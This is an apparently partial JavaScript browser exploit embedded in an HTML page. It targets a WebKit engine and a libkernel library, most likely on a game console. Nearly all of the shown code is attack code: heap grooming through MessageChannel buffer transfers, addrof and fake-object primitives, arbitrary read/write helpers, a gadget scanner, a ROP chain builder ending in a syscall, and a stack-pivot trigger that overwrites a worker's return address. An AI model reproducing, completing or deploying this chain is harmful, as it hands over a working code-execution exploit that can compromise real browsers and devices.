    scratchWords[1] = high;

    arwRestoreVector();
    return val;
}

function findGadget(libBase, pattern) {
    var scanSize = 0x200000n;

    for (var off = 0n; off < scanSize; off++) {
        var match = true;
        for (var i = 0; i < pattern.length; i++) {
            var b = Number((arwRead8(libBase + off + BigInt(i)) >> BigInt((i % 8) * 8)) & 0xffn);
            if (b !== pattern[i]) { match = false; break; }
        }
        if (match) { mark("GADGET-FOUND", hex(libBase + off)); return libBase + off; }
    }
    mark("GADGET-NOTFOUND", pattern.map(function(b){return b.toString(16);}).join(""));
    return null;
}

    chainU64[idx++] = 74n;
    chainU64[idx++] = gGadgets.syscall || 0x7575757575757575n;

    mark("ROP-CHAIN-BUILT", "entries=" + idx);
    return { buffer: chainBuf, u64: chainU64, entries: idx };
}

// ═══════════════════════════════════════════════════════════════════════════════
// PART 7 — Trigger
// ═══════════════════════════════════════════════════════════════════════════════
function triggerStackPivot(ropAddr) {
    if (!gWorker || !gWorkerStack) { mark("TRIGGER-FAIL", "no-worker-or-stack"); return; }
    var returnOffset = 0x7fb88n;
    var returnAddr = gWorkerStack + returnOffset;
    var currentRet = arwRead8(returnAddr);
    mark("TRIGGER-CURRENT-RET", hex(currentRet));
    arwWrite8(returnAddr, gGadgets.pop_rsp);
    arwWrite8(returnAddr + 8n, ropAddr);
    mark("TRIGGER-WRITTEN", "pop_rsp=" + hex(gGadgets.pop_rsp) + "-rop=" + hex(ropAddr));
    gWorker.postMessage(0);
    mark("TRIGGER-SENT", "postMessage-fired");
}

// ═══════════════════════════════════════════════════════════════════════════════
// PART 8 — Main Exploitation Flow
// ═══════════════════════════════════════════════════════════════════════════════
function beginExploitation() {
    mark("EXPLOIT-START", "ARW-confirmed");
    gLibkernelBase = findLibkernelBase();
    if (!gLibkernelBase) { mark("EXPLOIT-FAIL", "libkernel-not-found"); return; }
    gGadgets = findAllGadgets(gLibkernelBase);
    if (!gGadgets.pop_rdi || !gGadgets.syscall) { mark("EXPLOIT-FAIL", "gadgets-missing"); return; }
    gWebKitBase = findWebKitBase();
    gWorkerStack = leakWorkerStack();
    if (!gWorkerStack) { mark("EXPLOIT-FAIL", "stack-not-found"); return; }
    var rop = buildROPChain();
    gRopChainAddr = targetVector;
    mark("ROP-ADDR-PLACEHOLDER", hex(gRopChainAddr));
    triggerStackPivot(gRopChainAddr);
}

// ═══════════════════════════════════════════════════════════════════════════════
// PART 9 — Reporting (calls exploitation on success)
// ═══════════════════════════════════════════════════════════════════════════════
function reportComposition() {
    if (compositionState < 0) {
        mark(retrySafe ? "SSV-PLACEMENT-MISS" : "LOAD-THREW",
            (compositionError && compositionError.name) + ":" + String(compositionError && compositionError.message).slice(0, 80));
        if (!retrySafe) { try { sessionStorage.setItem(REVISION + ":blocked", "1"); } catch (_) {} }
        return;
    }
    if (compositionState === 2) { mark("NORMAL-CLONE-MISS", "known-reference-returned=true"); return; }
    if (compositionState === 3) {
        mark("HEADER-MISMATCH", "rw=" + rwHeaderOK + "-target=" + targetHeaderOK);
        if (!retrySafe) { try { sessionStorage.setItem(REVISION + ":blocked", "1"); } catch (_) {} }
        return;
    }
    if (compositionState === 0) { mark("NO-RESULT", "critical-load-did-not-finish"); return; }

    mark("SSV-RETURNED-CLEARED", "length=" + compositionLength);
    mark("RW-CARRIER", "sid=" + hex(gRWSID) + "-vector=" + hex(rwOriginalVector));
    mark("TARGET-CELL", "P=" + hex(targetAddress) + "-vector=" + hex(targetVector));

    var readPass = rwHeaderOK && targetHeaderOK && readObserved && compositionLength === EXPECTED_LENGTH;
    var writePass = writeObserved && restoreObserved;

    if (readPass && writePass) {
        mark("GENUINE-U8-RW-PASS", "candidate-rooted=true");
        try { sessionStorage.setItem(REVISION + ":passed", "1"); } catch (_) {}
        setTimeout(beginExploitation, 100);
    } else {
        mark("ARW-PARTIAL", "read=" + readPass + "-write=" + writePass);
    }
}

function runGroomAndLoad() {
    try {
        mark("SSV-GROOM-ENTER", "n=" + DRAIN_COUNT);
        var channel = new MessageChannel();
        channel.port1.close(); channel.port2.close();
        for (var i = 0; i < DRAIN_COUNT; ++i) keepAlive[keepIndex++] = buffer(DRAIN_SIZE);
        var slab = buffer(SLAB_SIZE);
        channel.port1.postMessage(0, [slab]);
        slab = null;
        var butterflyHole1 = buffer(BUTTERFLY_HOLE_SIZE);
        var butterflyHole2 = buffer(BUTTERFLY_HOLE_SIZE);
        var separator = buffer(SEPARATOR_SIZE);
        var earlyHole = buffer(EARLY_HOLE_SIZE);
        var guard = buffer(GUARD_SIZE);
        var predecessor = buffer(PREDECESSOR_SIZE);
        var finalHole = buffer(FINAL_HOLE_SIZE);
        fillRawCellPointers(predecessor, fakeAddress);
        keepAlive[keepIndex++] = separator;
        keepAlive[keepIndex++] = guard;
        keepAlive[keepIndex++] = predecessor;
        mark("PREDECESSOR-FILLED", "qwords=" + (PREDECESSOR_SIZE / 8) + "-fake=" + hex(fakeAddress));
        channel.port1.postMessage(0, [butterflyHole1, butterflyHole2, earlyHole, finalHole]);
        loadHistoryCritical();
    } catch (error) {
        try { clearPredecessor(); } catch (_) {}
        compositionError = error; compositionState = -1;
    }
    reportComposition();
}

function beginComposition() {
    if (captureState === 0) { mark("ADDROF-NO-RESULT", "capture-task-did-not-finish"); return; }
    if (captureState < 0) {
        mark("ADDROF-THREW", (captureError && captureError.name) + ":" + String(captureError && captureError.message).slice(0, 80));
        return;
    }
    var a0 = pointerFromWords(capturedWords, 0);
    var b0 = pointerFromWords(capturedWords, 4);
    var a1 = pointerFromWords(capturedWords, 8);
    var b1 = pointerFromWords(capturedWords, 12);
    var repeated = a0 === a1 && b0 === b1;
    var distinct = a0 !== b0;
    var plausible = plausibleCell(a0) && plausibleCell(b0) && plausibleCell(a1) && plausibleCell(b1);
    var fakeChars = copiedLength >= 8 ? copiedLength - 8 : 0;
    var sourceCovered = fakeChars * 2 <= CARRIER_BYTES;

    mark("ADDROF-RETURNED", REVISION);
    mark("ADDROF-COPY", "chars=" + copiedLength + "-source-covered=" + sourceCovered);
    mark("ADDROF-POINTERS", "HOST=" + hex(a0) + "-TARGET=" + hex(b0) + "-HOST2=" + hex(a1) + "-TARGET2=" + hex(b1));

    if (!(repeated && distinct && plausible && sourceCovered)) {
        mark("ADDROF-FAIL", "repeat=" + repeated + "-distinct=" + distinct + "-plausible=" + plausible + "-covered=" + sourceCovered);
        return;
    }

    hostAddress = a0;
    targetAddress = b0;
    targetAddressHigh = Math.floor(targetAddress / 0x100000000);
    targetAddressLow = targetAddress - targetAddressHigh * 0x100000000;
    if (targetAddressHigh < 0 || targetAddressHigh > 0xffff || targetAddressLow < 0 || targetAddressLow > 0xffffffff
        || Math.floor(targetAddressLow) !== targetAddressLow || targetAddressLow + targetAddressHigh * 0x100000000 !== targetAddress) {
        mark("TARGET-ADDRESS-FAIL", "target=" + hex(targetAddress)); return;
    }
    fakeAddress = hostAddress + 0x10;
    if (!plausibleCell(fakeAddress) || fakeAddress - hostAddress !== 0x10) {
        mark("FAKE-ADDRESS-FAIL", "host=" + hex(hostAddress)); return;
    }
    mark("FAKE-ADDRESS", "host=" + hex(hostAddress) + "-fake=" + hex(fakeAddress) + "-delta=0x10");
    runGroomAndLoad();
}

// ═══════════════════════════════════════════════════════════════════════════════
// PART 10 — Boot
// ═══════════════════════════════════════════════════════════════════════════════
var allowAgain = true;
var attemptKey = REVISION + ":attempts";
var passKey = REVISION + ":passed";
var blockKey = REVISION + ":blocked";
var priorAttempts = 0;
var alreadyPassed = false;
var alreadyBlocked = false;
try {
    priorAttempts = parseInt(sessionStorage.getItem(attemptKey) || "0", 10);
    if (!isFinite(priorAttempts) || priorAttempts < 0) priorAttempts = 0;
    alreadyPassed = sessionStorage.getItem(passKey) === "1";
    alreadyBlocked = sessionStorage.getItem(blockKey) === "1";
} catch (_) {}
attemptNumber = priorAttempts + 1;

mark("BOOT", "rev=" + REVISION + "-k=" + K + "-n=" + DRAIN_COUNT + "-attempt=" + attemptNumber + "-max=" + MAX_ATTEMPTS);

if (alreadyPassed && !allowAgain) {
    mark("PASS-ALREADY-BLOCKED", "no-more-runs-needed");
} else if (alreadyBlocked && !allowAgain) {
    mark("CANDIDATE-RETURNED-BLOCKED", "manual-review-required");
} else if (priorAttempts >= MAX_ATTEMPTS && !allowAgain) {
    mark("RETRY-LIMIT", "max=" + MAX_ATTEMPTS + "-no-more-runs");
} else if (typeof BigInt !== "function" || typeof MessageChannel !== "function"
    || typeof Symbol !== "function" || typeof history === "undefined"
    || typeof history.replaceState !== "function") {
    mark("UNSUPPORTED");
} else {
    try { sessionStorage.setItem(attemptKey, String(attemptNumber)); } catch (_) {}
    try {
        buildAndStoreGraph();
        prepareAddrof();
    } catch (error) {
        mark("SETUP-THREW", (error && error.name) + ":" + String(error && error.message).slice(0, 80));
    }
}
</script>
</body>
